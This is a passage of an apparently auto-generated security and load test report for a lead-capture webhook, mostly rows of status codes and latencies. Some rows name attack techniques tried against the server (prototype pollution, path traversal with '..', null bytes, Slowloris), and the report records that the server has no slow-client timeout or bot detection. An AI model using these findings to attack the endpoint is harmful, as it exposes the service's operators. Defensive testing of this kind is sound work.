| 551 | Security | Proto pollution attempt #2 | status 200 (safe if no merge) | status 200 | ✅ | JSON.parse creates clean objects - prototype pollution unlikely |
| 552 | Security | Proto pollution attempt #3 | status 200 (safe if no merge) | status 200 | ✅ | JSON.parse creates clean objects - prototype pollution unlikely |
| 553 | Security | Proto pollution attempt #4 | status 200 (safe if no merge) | status 200 | ✅ | JSON.parse creates clean objects - prototype pollution unlikely |
| 554 | Security | Proto pollution attempt #5 | status 200 (safe if no merge) | status 200 | ✅ | JSON.parse creates clean objects - prototype pollution unlikely |
| 555 | Security | Health check after proto pollution #1 | status 200 | status 200 | ✅ |  |
| 556 | Security | Health check after proto pollution #2 | status 200 | status 200 | ✅ |  |
| 557 | Security | Health check after proto pollution #3 | status 200 | status 200 | ✅ |  |
| 558 | Security | Health check after proto pollution #4 | status 200 | status 200 | ✅ |  |
| 559 | Security | Health check after proto pollution #5 | status 200 | status 200 | ✅ |  |
| 560 | Load | 50 concurrent: 50 ok, 0 failed, 110ms | all 200 | 50/50 succeeded in 110ms | ✅ |  |
| 561 | Load | Concurrent #1 | status 200 | status 200, 13ms | ✅ |  |
| 562 | Load | Concurrent #2 | status 200 | status 200, 84ms | ✅ |  |
| 563 | Load | Concurrent #3 | status 200 | status 200, 84ms | ✅ |  |
| 564 | Load | Concurrent #4 | status 200 | status 200, 87ms | ✅ |  |
| 565 | Load | Concurrent #5 | status 200 | status 200, 89ms | ✅ |  |
| 566 | Load | Concurrent #6 | status 200 | status 200, 93ms | ✅ |  |
| 567 | Load | Concurrent #7 | status 200 | status 200, 92ms | ✅ |  |
| 568 | Load | Concurrent #8 | status 200 | status 200, 93ms | ✅ |  |
| 569 | Load | Concurrent #9 | status 200 | status 200, 93ms | ✅ |  |
| 570 | Load | Concurrent #10 | status 200 | status 200, 94ms | ✅ |  |
| 571 | Load | Concurrent #11 | status 200 | status 200, 94ms | ✅ |  |
| 572 | Load | Concurrent #12 | status 200 | status 200, 95ms | ✅ |  |
| 573 | Load | Concurrent #13 | status 200 | status 200, 95ms | ✅ |  |
| 574 | Load | Concurrent #14 | status 200 | status 200, 96ms | ✅ |  |
| 575 | Load | Concurrent #15 | status 200 | status 200, 95ms | ✅ |  |
| 576 | Load | Concurrent #16 | status 200 | status 200, 96ms | ✅ |  |
| 577 | Load | Concurrent #17 | status 200 | status 200, 97ms | ✅ |  |
| 578 | Load | Concurrent #18 | status 200 | status 200, 97ms | ✅ |  |
| 579 | Load | Concurrent #19 | status 200 | status 200, 98ms | ✅ |  |
| 580 | Load | Concurrent #20 | status 200 | status 200, 98ms | ✅ |  |
| 581 | Load | Concurrent #21 | status 200 | status 200, 99ms | ✅ |  |
| 582 | Load | Concurrent #22 | status 200 | status 200, 98ms | ✅ |  |
| 583 | Load | Concurrent #23 | status 200 | status 200, 102ms | ✅ |  |
| 584 | Load | Concurrent #24 | status 200 | status 200, 103ms | ✅ |  |
| 585 | Load | Concurrent #25 | status 200 | status 200, 103ms | ✅ |  |
| 586 | Load | Concurrent #26 | status 200 | status 200, 103ms | ✅ |  |
| 587 | Load | Concurrent #27 | status 200 | status 200, 103ms | ✅ |  |
| 588 | Load | Concurrent #28 | status 200 | status 200, 103ms | ✅ |  |
| 589 | Load | Concurrent #29 | status 200 | status 200, 104ms | ✅ |  |
| 590 | Load | Concurrent #30 | status 200 | status 200, 104ms | ✅ |  |
| 591 | Load | Concurrent #31 | status 200 | status 200, 104ms | ✅ |  |
| 592 | Load | Concurrent #32 | status 200 | status 200, 104ms | ✅ |  |
| 593 | Load | Concurrent #33 | status 200 | status 200, 104ms | ✅ |  |
| 594 | Load | Concurrent #34 | status 200 | status 200, 105ms | ✅ |  |
| 595 | Load | Concurrent #35 | status 200 | status 200, 105ms | ✅ |  |
| 596 | Load | Concurrent #36 | status 200 | status 200, 104ms | ✅ |  |
| 597 | Load | Concurrent #37 | status 200 | status 200, 104ms | ✅ |  |
| 598 | Load | Concurrent #38 | status 200 | status 200, 105ms | ✅ |  |
| 599 | Load | Concurrent #39 | status 200 | status 200, 109ms | ✅ |  |
| 600 | Load | Concurrent #40 | status 200 | status 200, 109ms | ✅ |  |
| 601 | Load | Concurrent #41 | status 200 | status 200, 112ms | ✅ |  |
| 602 | Load | Concurrent #42 | status 200 | status 200, 109ms | ✅ |  |
| 603 | Load | Concurrent #43 | status 200 | status 200, 108ms | ✅ |  |
| 604 | Load | Concurrent #44 | status 200 | status 200, 108ms | ✅ |  |
| 605 | Load | Concurrent #45 | status 200 | status 200, 108ms | ✅ |  |
| 606 | Load | Concurrent #46 | status 200 | status 200, 109ms | ✅ |  |
| 607 | Load | Concurrent #47 | status 200 | status 200, 109ms | ✅ |  |
| 608 | Load | Concurrent #48 | status 200 | status 200, 109ms | ✅ |  |
| 609 | Load | Concurrent #49 | status 200 | status 200, 110ms | ✅ |  |
| 610 | Load | Concurrent #50 | status 200 | status 200, 110ms | ✅ |  |
| 611 | Load | 100-request burst: 100/100 in 583ms | all succeed | 100/100 in 583ms | ✅ |  |
| 612 | Load | Burst sample #0 | status 200 | status 200, 8ms | ✅ |  |
| 613 | Load | Burst sample #5 | status 200 | status 200, 8ms | ✅ |  |
| 614 | Load | Burst sample #10 | status 200 | status 200, 13ms | ✅ |  |
| 615 | Load | Burst sample #15 | status 200 | status 200, 15ms | ✅ |  |
| 616 | Load | Burst sample #20 | status 200 | status 200, 3ms | ✅ |  |
| 617 | Load | Burst sample #25 | status 200 | status 200, 5ms | ✅ |  |
| 618 | Load | Burst sample #30 | status 200 | status 200, 7ms | ✅ |  |
| 619 | Load | Burst sample #35 | status 200 | status 200, 9ms | ✅ |  |
| 620 | Load | Burst sample #40 | status 200 | status 200, 3ms | ✅ |  |
| 621 | Load | Burst sample #45 | status 200 | status 200, 6ms | ✅ |  |
| 622 | Load | Burst sample #50 | status 200 | status 200, 12ms | ✅ |  |
| 623 | Load | Burst sample #55 | status 200 | status 200, 17ms | ✅ |  |
| 624 | Load | Burst sample #60 | status 200 | status 200, 3ms | ✅ |  |
| 625 | Load | Burst sample #65 | status 200 | status 200, 5ms | ✅ |  |
| 626 | Load | Burst sample #70 | status 200 | status 200, 14ms | ✅ |  |
| 627 | Load | Burst sample #75 | status 200 | status 200, 17ms | ✅ |  |
| 628 | Load | Burst sample #80 | status 200 | status 200, 3ms | ✅ |  |
| 629 | Load | Burst sample #85 | status 200 | status 200, 5ms | ✅ |  |
| 630 | Load | Burst sample #90 | status 200 | status 200, 7ms | ✅ |  |
| 631 | Load | Burst sample #95 | status 200 | status 200, 10ms | ✅ |  |
| 632 | Load | Post-burst health #1 | status 200, <100ms | status 200, 1ms | ✅ |  |
| 633 | Load | Post-burst health #2 | status 200, <100ms | status 200, 1ms | ✅ |  |
| 634 | Load | Post-burst health #3 | status 200, <100ms | status 200, 1ms | ✅ |  |
| 635 | Load | Post-burst health #4 | status 200, <100ms | status 200, 1ms | ✅ |  |
| 636 | Load | Post-burst health #5 | status 200, <100ms | status 200, 0ms | ✅ |  |
| 637 | Load | Post-burst health #6 | status 200, <100ms | status 200, 1ms | ✅ |  |
| 638 | Load | Post-burst health #7 | status 200, <100ms | status 200, 1ms | ✅ |  |
| 639 | Load | Post-burst health #8 | status 200, <100ms | status 200, 0ms | ✅ |  |
| 640 | Load | Post-burst health #9 | status 200, <100ms | status 200, 1ms | ✅ |  |
| 641 | Load | Post-burst health #10 | status 200, <100ms | status 200, 0ms | ✅ |  |
| 642 | Load | Mixed concurrent #1 (valid) | status 200 | status 200 | ✅ |  |
| 643 | Load | Mixed concurrent #2 (bad auth) | status 401 | status 401 | ✅ |  |
| 644 | Load | Mixed concurrent #3 (malformed) | status 200 | status 200 | ✅ |  |
| 645 | Load | Mixed concurrent #4 (valid) | status 200 | status 200 | ✅ |  |
| 646 | Load | Mixed concurrent #5 (bad auth) | status 401 | status 401 | ✅ |  |
| 647 | Load | Mixed concurrent #6 (malformed) | status 200 | status 200 | ✅ |  |
| 648 | Load | Mixed concurrent #7 (valid) | status 200 | status 200 | ✅ |  |
| 649 | Load | Mixed concurrent #8 (bad auth) | status 401 | status 401 | ✅ |  |
| 650 | Load | Mixed concurrent #9 (malformed) | status 200 | status 200 | ✅ |  |
| 651 | Load | Mixed concurrent #10 (valid) | status 200 | status 200 | ✅ |  |
| 652 | Load | Mixed concurrent #11 (bad auth) | status 401 | status 401 | ✅ |  |
| 653 | Load | Mixed concurrent #12 (malformed) | status 200 | status 200 | ✅ |  |
| 654 | Load | Mixed concurrent #13 (valid) | status 200 | status 200 | ✅ |  |
| 655 | Load | Mixed concurrent #14 (bad auth) | status 401 | status 401 | ✅ |  |
| 656 | Load | Mixed concurrent #15 (malformed) | status 200 | status 200 | ✅ |  |
| 657 | Load | Mixed concurrent #16 (valid) | status 200 | status 200 | ✅ |  |
| 658 | Load | Mixed concurrent #17 (bad auth) | status 401 | status 401 | ✅ |  |
| 659 | Load | Mixed concurrent #18 (malformed) | status 200 | status 200 | ✅ |  |
| 660 | Load | Mixed concurrent #19 (valid) | status 200 | status 200 | ✅ |  |
| 661 | Load | Mixed concurrent #20 (bad auth) | status 401 | status 401 | ✅ |  |
| 662 | Load | Mixed concurrent #21 (malformed) | status 200 | status 200 | ✅ |  |
| 663 | Load | Mixed concurrent #22 (valid) | status 200 | status 200 | ✅ |  |
| 664 | Load | Mixed concurrent #23 (bad auth) | status 401 | status 401 | ✅ |  |
| 665 | Load | Mixed concurrent #24 (malformed) | status 200 | status 200 | ✅ |  |
| 666 | Load | Mixed concurrent #25 (valid) | status 200 | status 200 | ✅ |  |
| 667 | Load | Mixed concurrent #26 (bad auth) | status 401 | status 401 | ✅ |  |
| 668 | Load | Mixed concurrent #27 (malformed) | status 200 | status 200 | ✅ |  |
| 669 | Load | Mixed concurrent #28 (valid) | status 200 | status 200 | ✅ |  |
| 670 | Load | Mixed concurrent #29 (bad auth) | status 401 | status 401 | ✅ |  |
| 671 | Load | Mixed concurrent #30 (malformed) | status 200 | status 200 | ✅ |  |
| 672 | Load | Final health check | status 200 | status 200, 3ms | ✅ |  |
| 673 | EdgeCase | Empty string: First Name | status 200 | status 200 | ✅ |  |
| 674 | EdgeCase | Empty string: Last Name | status 200 | status 200 | ✅ |  |
| 675 | EdgeCase | Empty string: Title | status 200 | status 200 | ✅ |  |
| 676 | EdgeCase | Empty string: Company Name | status 200 | status 200 | ✅ |  |
| 677 | EdgeCase | Empty string: Industry | status 200 | status 200 | ✅ |  |
| 678 | EdgeCase | Empty string: Business Email | status 200 | status 200 | ✅ |  |
| 679 | EdgeCase | Empty string: LinkedIn URL | status 200 | status 200 | ✅ |  |
| 680 | EdgeCase | Empty string: Captured URL | status 200 | status 200 | ✅ |  |
| 681 | EdgeCase | Empty string: City | status 200 | status 200 | ✅ |  |
| 682 | EdgeCase | Empty string: State | status 200 | status 200 | ✅ |  |
| 683 | EdgeCase | All fields empty strings | status 200 | status 200 | ✅ |  |
| 684 | EdgeCase | Number in First Name: 12345 | status 200 (may crash on toLowerCase) | status 200, body: {"received":true,"score":100,"qu | ✅ |  |
| 685 | EdgeCase | Number in Last Name: 0 | status 200 (may crash on toLowerCase) | status 200, body: {"received":true,"score":100,"qu | ✅ |  |
| 686 | EdgeCase | Number in Title: -1 | status 200 (may crash on toLowerCase) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 687 | EdgeCase | Number in Company Name: 3.14159 | status 200 (may crash on toLowerCase) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 688 | EdgeCase | Number in Industry: 9007199254740991 | status 200 (may crash on toLowerCase) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 689 | EdgeCase | Number in Business Email: 42 | status 200 (may crash on toLowerCase) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 690 | EdgeCase | Number in City: NaN | status 200 (may crash on toLowerCase) | status 200, body: {"received":true,"score":100,"qu | ✅ |  |
| 691 | EdgeCase | Number in State: Infinity | status 200 (may crash on toLowerCase) | status 200, body: {"received":true,"score":100,"qu | ✅ |  |
| 692 | EdgeCase | Number in Employee Count: 100 | status 200 (may crash on toLowerCase) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 693 | EdgeCase | Number in Captured URL: 0 | status 200 (may crash on toLowerCase) | status 200, body: {"received":true,"score":80,"qua | ✅ |  |
| 694 | EdgeCase | Array in Title | status 200 (graceful handling) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 695 | EdgeCase | Object in Title | status 200 (graceful handling) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 696 | EdgeCase | Array in Company | status 200 (graceful handling) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 697 | EdgeCase | Object in Industry | status 200 (graceful handling) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 698 | EdgeCase | Boolean true in First Name | status 200 (graceful handling) | status 200, body: {"received":true,"score":100,"qu | ✅ |  |
| 699 | EdgeCase | Boolean false in First Name | status 200 (graceful handling) | status 200, body: {"received":true,"score":100,"qu | ✅ |  |
| 700 | EdgeCase | Array in Employee Count | status 200 (graceful handling) | status 200, body: {"received":true,"score":90,"qua | ✅ |  |
| 701 | EdgeCase | Object in Captured URL | status 200 (graceful handling) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 702 | EdgeCase | Number in LinkedIn URL | status 200 (graceful handling) | status 200, body: {"received":true,"score":100,"qu | ✅ |  |
| 703 | EdgeCase | Null in Business Email | status 200 (graceful handling) | status 200, body: {"received":true,"score":90,"qua | ✅ |  |
| 704 | EdgeCase | Undefined in Referrer | status 200 (graceful handling) | status 200, body: {"received":true,"score":100,"qu | ✅ |  |
| 705 | EdgeCase | Empty array in City | status 200 (graceful handling) | status 200, body: {"received":true,"score":100,"qu | ✅ |  |
| 706 | EdgeCase | Empty object in State | status 200 (graceful handling) | status 200, body: {"received":true,"score":100,"qu | ✅ |  |
| 707 | EdgeCase | Array in Revenue | status 200 (graceful handling) | status 200, body: {"received":true,"score":100,"qu | ✅ |  |
| 708 | EdgeCase | Function in Title | status 200 (graceful handling) | status 200, body: {"received":true,"score":70,"qua | ✅ |  |
| 709 | EdgeCase | Unix epoch date | status 200 | status 200 | ✅ |  |
| 710 | EdgeCase | Y2K date | status 200 | status 200 | ✅ |  |
| 711 | EdgeCase | Future date (2099) | status 200 | status 200 | ✅ |  |
| 712 | EdgeCase | Negative timestamp | status 200 | status 200 | ✅ |  |
| 713 | EdgeCase | Invalid date string | status 200 | status 200 | ✅ |  |
| 714 | EdgeCase | Location: London, UK | status 200 | status 200 | ✅ |  |
| 715 | EdgeCase | Location: Tokyo, Japan | status 200 | status 200 | ✅ |  |
| 716 | EdgeCase | Location: São Paulo, Brazil | status 200 | status 200 | ✅ |  |
| 717 | EdgeCase | Location: München, Germany | status 200 | status 200 | ✅ |  |
| 718 | EdgeCase | Location: Москва, Russia | status 200 | status 200 | ✅ |  |
| 719 | EdgeCase | Location: 北京, China | status 200 | status 200 | ✅ |  |
| 720 | EdgeCase | Location: (empty), (empty) | status 200 | status 200 | ✅ |  |
| 721 | EdgeCase | Location: Dubai, UAE | status 200 | status 200 | ✅ |  |
| 722 | EdgeCase | Location: Mumbai, India | status 200 | status 200 | ✅ |  |
| 723 | EdgeCase | Location: Lagos, Nigeria | status 200 | status 200 | ✅ |  |
| 724 | EdgeCase | Bot user agent header | status 200 (no bot detection) | status 200 | ✅ | Server has no bot detection |
| 725 | EdgeCase | Headless Chrome UA | status 200 (no bot detection) | status 200 | ✅ | Server has no bot detection |
| 726 | EdgeCase | Curl UA | status 200 (no bot detection) | status 200 | ✅ | Server has no bot detection |
| 727 | EdgeCase | Python requests UA | status 200 (no bot detection) | status 200 | ✅ | Server has no bot detection |
| 728 | EdgeCase | No UA | status 200 (no bot detection) | status 200 | ✅ | Server has no bot detection |
| 729 | EdgeCase | Empty UA | status 200 (no bot detection) | status 200 | ✅ | Server has no bot detection |
| 730 | EdgeCase | Selenium-like | status 200 (no bot detection) | status 200 | ✅ | Server has no bot detection |
| 731 | EdgeCase | Scrapy bot | status 200 (no bot detection) | status 200 | ✅ | Server has no bot detection |
| 732 | EdgeCase | Wget | status 200 (no bot detection) | status 200 | ✅ | Server has no bot detection |
| 733 | EdgeCase | Apache HttpClient | status 200 (no bot detection) | status 200 | ✅ | Server has no bot detection |
| 734 | EdgeCase | Repeat Visitor: true | status 200 | status 200 | ✅ |  |
| 735 | EdgeCase | Repeat Visitor: false | status 200 | status 200 | ✅ |  |
| 736 | EdgeCase | Repeat Visitor: "true" | status 200 | status 200 | ✅ |  |
| 737 | EdgeCase | Repeat Visitor: "false" | status 200 | status 200 | ✅ |  |
| 738 | EdgeCase | Repeat Visitor: 1 | status 200 | status 200 | ✅ |  |
| 739 | EdgeCase | Repeat Visitor: 0 | status 200 | status 200 | ✅ |  |
| 740 | EdgeCase | Repeat Visitor: "yes" | status 200 | status 200 | ✅ |  |
| 741 | EdgeCase | Repeat Visitor: "no" | status 200 | status 200 | ✅ |  |
| 742 | EdgeCase | Repeat Visitor: null | status 200 | status 200 | ✅ |  |
| 743 | EdgeCase | Repeat Visitor: "" | status 200 | status 200 | ✅ |  |
| 744 | EdgeCase | HTTP GET to webhook | status 404 (only POST allowed) | status 404 | ✅ |  |
| 745 | EdgeCase | HTTP PUT to webhook | status 404 (only POST allowed) | status 404 | ✅ |  |
| 746 | EdgeCase | HTTP DELETE to webhook | status 404 (only POST allowed) | status 404 | ✅ |  |
| 747 | EdgeCase | HTTP PATCH to webhook | status 404 (only POST allowed) | status 0 | ❌ |  |
| 748 | EdgeCase | HTTP OPTIONS to webhook | status 404 (only POST allowed) | status 404 | ✅ |  |
| 749 | EdgeCase | HTTP HEAD to webhook | status 404 (only POST allowed) | status 0 | ❌ |  |
| 750 | EdgeCase | HTTP TRACE to webhook | status 404 (only POST allowed) | status 404 | ✅ |  |
| 751 | EdgeCase | HTTP CONNECT to webhook | status 404 (only POST allowed) | status 0 | ❌ |  |
| 752 | EdgeCase | Double slash | varies | status 404 | ✅ | Rejected: 404 |
| 753 | EdgeCase | Trailing slash | varies | status 404 | ✅ | Rejected: 404 |
| 754 | EdgeCase | Case variation | varies | status 404 | ✅ | Rejected: 404 |
| 755 | EdgeCase | URL encoded path | varies | status 404 | ✅ | Rejected: 404 |
| 756 | EdgeCase | Dot in path | varies | status 200 | ✅ | Accepted |
| 757 | EdgeCase | Dotdot in path | varies | status 200 | ✅ | Accepted |
| 758 | EdgeCase | Just /rb2b | varies | status 200 | ✅ | Accepted |
| 759 | EdgeCase | Extra path segment | varies | status 404 | ✅ | Rejected: 404 |
| 760 | EdgeCase | Null byte in path | varies | status 404 | ✅ | Rejected: 404 |
| 761 | EdgeCase | Fragment in URL | varies | status 200 | ✅ | Accepted |

</details>

---

## 🔬 Test Infrastructure

- **Test Script:** Node.js HTTP client (no external deps)
- **Concurrency:** Native Promise.all for parallel requests
- **Timeout:** 10s default, 30s for oversized payloads
- **Date:** 2026-02-04T01:40:09.120Z

---

## 📊 COMBINED TOTALS (Wave 1 + Wave 2)

| Metric | Count |
|--------|-------|
| **Total Tests** | 984 |
| **Passed** | 976 ✅ |
| **Failed** | 8 ❌ |
| **Pass Rate** | 99.2% |


---

## 📊 Wave 2 Additional Tests

**Total Additional Tests:** 223  
**Passed:** 222 ✅  
**Failed:** 1 ❌  

### Wave 2 Categories

| Category | Total | Passed | Failed | Pass Rate |
|----------|-------|--------|--------|-----------|
| Load-Wave2 | 146 | 146 | 0 | 100.0% |
| EdgeCase-Wave2 | 40 | 40 | 0 | 100.0% |
| Security-Wave2 | 37 | 36 | 1 | 97.3% |

### Wave 2 Crash Scenarios
None detected.

### Wave 2 Unexpected Behaviors
- **#222** Slowloris (5s delayed body): Connection held open - no server timeout on slow clients

### Wave 2 Additional Vulnerabilities Found
None.

<details>
<summary>Wave 2 Full Test Log (223 tests)</summary>

| # | Category | Test | Expected | Actual | Result | Notes |
|---|----------|------|----------|--------|--------|-------|
| 1 | Load-Wave2 | 100 concurrent: 100/100 in 141ms | most succeed | 100/100 | ✅ |  |
| 2 | Load-Wave2 | W2 Concurrent #1 | 200 | 200 (30ms) | ✅ |  |
| 3 | Load-Wave2 | W2 Concurrent #2 | 200 | 200 (96ms) | ✅ |  |
| 4 | Load-Wave2 | W2 Concurrent #3 | 200 | 200 (96ms) | ✅ |  |
| 5 | Load-Wave2 | W2 Concurrent #4 | 200 | 200 (96ms) | ✅ |  |
| 6 | Load-Wave2 | W2 Concurrent #5 | 200 | 200 (96ms) | ✅ |  |
| 7 | Load-Wave2 | W2 Concurrent #6 | 200 | 200 (96ms) | ✅ |  |
| 8 | Load-Wave2 | W2 Concurrent #7 | 200 | 200 (95ms) | ✅ |  |
| 9 | Load-Wave2 | W2 Concurrent #8 | 200 | 200 (95ms) | ✅ |  |
| 10 | Load-Wave2 | W2 Concurrent #9 | 200 | 200 (95ms) | ✅ |  |
| 11 | Load-Wave2 | W2 Concurrent #10 | 200 | 200 (95ms) | ✅ |  |
| 12 | Load-Wave2 | W2 Concurrent #11 | 200 | 200 (95ms) | ✅ |  |
| 13 | Load-Wave2 | W2 Concurrent #12 | 200 | 200 (95ms) | ✅ |  |
| 14 | Load-Wave2 | W2 Concurrent #13 | 200 | 200 (94ms) | ✅ |  |
| 15 | Load-Wave2 | W2 Concurrent #14 | 200 | 200 (95ms) | ✅ |  |
| 16 | Load-Wave2 | W2 Concurrent #15 | 200 | 200 (95ms) | ✅ |  |
| 17 | Load-Wave2 | W2 Concurrent #16 | 200 | 200 (93ms) | ✅ |  |
| 18 | Load-Wave2 | W2 Concurrent #17 | 200 | 200 (93ms) | ✅ |  |
| 19 | Load-Wave2 | W2 Concurrent #18 | 200 | 200 (93ms) | ✅ |  |
| 20 | Load-Wave2 | W2 Concurrent #19 | 200 | 200 (93ms) | ✅ |  |
| 21 | Load-Wave2 | W2 Concurrent #20 | 200 | 200 (94ms) | ✅ |  |
| 22 | Load-Wave2 | W2 Concurrent #21 | 200 | 200 (94ms) | ✅ |  |
| 23 | Load-Wave2 | W2 Concurrent #22 | 200 | 200 (94ms) | ✅ |  |
| 24 | Load-Wave2 | W2 Concurrent #23 | 200 | 200 (94ms) | ✅ |  |
| 25 | Load-Wave2 | W2 Concurrent #24 | 200 | 200 (95ms) | ✅ |  |
| 26 | Load-Wave2 | W2 Concurrent #25 | 200 | 200 (95ms) | ✅ |  |
| 27 | Load-Wave2 | W2 Concurrent #26 | 200 | 200 (96ms) | ✅ |  |
| 28 | Load-Wave2 | W2 Concurrent #27 | 200 | 200 (97ms) | ✅ |  |
| 29 | Load-Wave2 | W2 Concurrent #28 | 200 | 200 (99ms) | ✅ |  |
| 30 | Load-Wave2 | W2 Concurrent #29 | 200 | 200 (99ms) | ✅ |  |
| 31 | Load-Wave2 | W2 Concurrent #30 | 200 | 200 (100ms) | ✅ |  |
| 32 | Load-Wave2 | W2 Concurrent #31 | 200 | 200 (100ms) | ✅ |  |
| 33 | Load-Wave2 | W2 Concurrent #32 | 200 | 200 (100ms) | ✅ |  |
| 34 | Load-Wave2 | W2 Concurrent #33 | 200 | 200 (100ms) | ✅ |  |
| 35 | Load-Wave2 | W2 Concurrent #34 | 200 | 200 (101ms) | ✅ |  |
| 36 | Load-Wave2 | W2 Concurrent #35 | 200 | 200 (100ms) | ✅ |  |
| 37 | Load-Wave2 | W2 Concurrent #36 | 200 | 200 (100ms) | ✅ |  |
| 38 | Load-Wave2 | W2 Concurrent #37 | 200 | 200 (101ms) | ✅ |  |
| 39 | Load-Wave2 | W2 Concurrent #38 | 200 | 200 (102ms) | ✅ |  |
| 40 | Load-Wave2 | W2 Concurrent #39 | 200 | 200 (102ms) | ✅ |  |
| 41 | Load-Wave2 | W2 Concurrent #40 | 200 | 200 (103ms) | ✅ |  |
| 42 | Load-Wave2 | W2 Concurrent #41 | 200 | 200 (104ms) | ✅ |  |
| 43 | Load-Wave2 | W2 Concurrent #42 | 200 | 200 (104ms) | ✅ |  |
| 44 | Load-Wave2 | W2 Concurrent #43 | 200 | 200 (104ms) | ✅ |  |
| 45 | Load-Wave2 | W2 Concurrent #44 | 200 | 200 (105ms) | ✅ |  |
| 46 | Load-Wave2 | W2 Concurrent #45 | 200 | 200 (106ms) | ✅ |  |
| 47 | Load-Wave2 | W2 Concurrent #46 | 200 | 200 (106ms) | ✅ |  |
| 48 | Load-Wave2 | W2 Concurrent #47 | 200 | 200 (107ms) | ✅ |  |
| 49 | Load-Wave2 | W2 Concurrent #48 | 200 | 200 (105ms) | ✅ |  |
| 50 | Load-Wave2 | W2 Concurrent #49 | 200 | 200 (106ms) | ✅ |  |
| 51 | Load-Wave2 | W2 Concurrent #50 | 200 | 200 (107ms) | ✅ |  |
| 52 | Load-Wave2 | W2 Concurrent #51 | 200 | 200 (107ms) | ✅ |  |
| 53 | Load-Wave2 | W2 Concurrent #52 | 200 | 200 (108ms) | ✅ |  |
| 54 | Load-Wave2 | W2 Concurrent #53 | 200 | 200 (108ms) | ✅ |  |
| 55 | Load-Wave2 | W2 Concurrent #54 | 200 | 200 (109ms) | ✅ |  |
| 56 | Load-Wave2 | W2 Concurrent #55 | 200 | 200 (108ms) | ✅ |  |
| 57 | Load-Wave2 | W2 Concurrent #56 | 200 | 200 (109ms) | ✅ |  |
| 58 | Load-Wave2 | W2 Concurrent #57 | 200 | 200 (110ms) | ✅ |  |
| 59 | Load-Wave2 | W2 Concurrent #58 | 200 | 200 (111ms) | ✅ |  |
| 60 | Load-Wave2 | W2 Concurrent #59 | 200 | 200 (111ms) | ✅ |  |
| 61 | Load-Wave2 | W2 Concurrent #60 | 200 | 200 (112ms) | ✅ |  |
| 62 | Load-Wave2 | W2 Concurrent #61 | 200 | 200 (112ms) | ✅ |  |
| 63 | Load-Wave2 | W2 Concurrent #62 | 200 | 200 (112ms) | ✅ |  |
| 64 | Load-Wave2 | W2 Concurrent #63 | 200 | 200 (120ms) | ✅ |  |
| 65 | Load-Wave2 | W2 Concurrent #64 | 200 | 200 (121ms) | ✅ |  |
| 66 | Load-Wave2 | W2 Concurrent #65 | 200 | 200 (122ms) | ✅ |  |
| 67 | Load-Wave2 | W2 Concurrent #66 | 200 | 200 (122ms) | ✅ |  |
| 68 | Load-Wave2 | W2 Concurrent #67 | 200 | 200 (123ms) | ✅ |  |
| 69 | Load-Wave2 | W2 Concurrent #68 | 200 | 200 (124ms) | ✅ |  |
| 70 | Load-Wave2 | W2 Concurrent #69 | 200 | 200 (123ms) | ✅ |  |
| 71 | Load-Wave2 | W2 Concurrent #70 | 200 | 200 (125ms) | ✅ |  |
| 72 | Load-Wave2 | W2 Concurrent #71 | 200 | 200 (125ms) | ✅ |  |
| 73 | Load-Wave2 | W2 Concurrent #72 | 200 | 200 (127ms) | ✅ |  |
| 74 | Load-Wave2 | W2 Concurrent #73 | 200 | 200 (128ms) | ✅ |  |
| 75 | Load-Wave2 | W2 Concurrent #74 | 200 | 200 (129ms) | ✅ |  |
| 76 | Load-Wave2 | W2 Concurrent #75 | 200 | 200 (130ms) | ✅ |  |
| 77 | Load-Wave2 | W2 Concurrent #76 | 200 | 200 (129ms) | ✅ |  |
| 78 | Load-Wave2 | W2 Concurrent #77 | 200 | 200 (129ms) | ✅ |  |
| 79 | Load-Wave2 | W2 Concurrent #78 | 200 | 200 (130ms) | ✅ |  |
| 80 | Load-Wave2 | W2 Concurrent #79 | 200 | 200 (131ms) | ✅ |  |
| 81 | Load-Wave2 | W2 Concurrent #80 | 200 | 200 (131ms) | ✅ |  |
| 82 | Load-Wave2 | W2 Concurrent #81 | 200 | 200 (134ms) | ✅ |  |
| 83 | Load-Wave2 | W2 Concurrent #82 | 200 | 200 (134ms) | ✅ |  |
| 84 | Load-Wave2 | W2 Concurrent #83 | 200 | 200 (135ms) | ✅ |  |
| 85 | Load-Wave2 | W2 Concurrent #84 | 200 | 200 (136ms) | ✅ |  |
| 86 | Load-Wave2 | W2 Concurrent #85 | 200 | 200 (136ms) | ✅ |  |
| 87 | Load-Wave2 | W2 Concurrent #86 | 200 | 200 (136ms) | ✅ |  |
| 88 | Load-Wave2 | W2 Concurrent #87 | 200 | 200 (137ms) | ✅ |  |
| 89 | Load-Wave2 | W2 Concurrent #88 | 200 | 200 (136ms) | ✅ |  |
| 90 | Load-Wave2 | W2 Concurrent #89 | 200 | 200 (137ms) | ✅ |  |
| 91 | Load-Wave2 | W2 Concurrent #90 | 200 | 200 (137ms) | ✅ |  |
| 92 | Load-Wave2 | W2 Concurrent #91 | 200 | 200 (138ms) | ✅ |  |
| 93 | Load-Wave2 | W2 Concurrent #92 | 200 | 200 (137ms) | ✅ |  |
| 94 | Load-Wave2 | W2 Concurrent #93 | 200 | 200 (138ms) | ✅ |  |
| 95 | Load-Wave2 | W2 Concurrent #94 | 200 | 200 (138ms) | ✅ |  |
| 96 | Load-Wave2 | W2 Concurrent #95 | 200 | 200 (139ms) | ✅ |  |
| 97 | Load-Wave2 | W2 Concurrent #96 | 200 | 200 (140ms) | ✅ |  |
| 98 | Load-Wave2 | W2 Concurrent #97 | 200 | 200 (140ms) | ✅ |  |
| 99 | Load-Wave2 | W2 Concurrent #98 | 200 | 200 (141ms) | ✅ |  |
| 100 | Load-Wave2 | W2 Concurrent #99 | 200 | 200 (141ms) | ✅ |  |
| 101 | Load-Wave2 | W2 Concurrent #100 | 200 | 200 (141ms) | ✅ |  |
| 102 | Load-Wave2 | Sequential #1 | 200 | 200 (2ms) | ✅ |  |
| 103 | Load-Wave2 | Sequential #2 | 200 | 200 (1ms) | ✅ |  |
| 104 | Load-Wave2 | Sequential #3 | 200 | 200 (1ms) | ✅ |  |
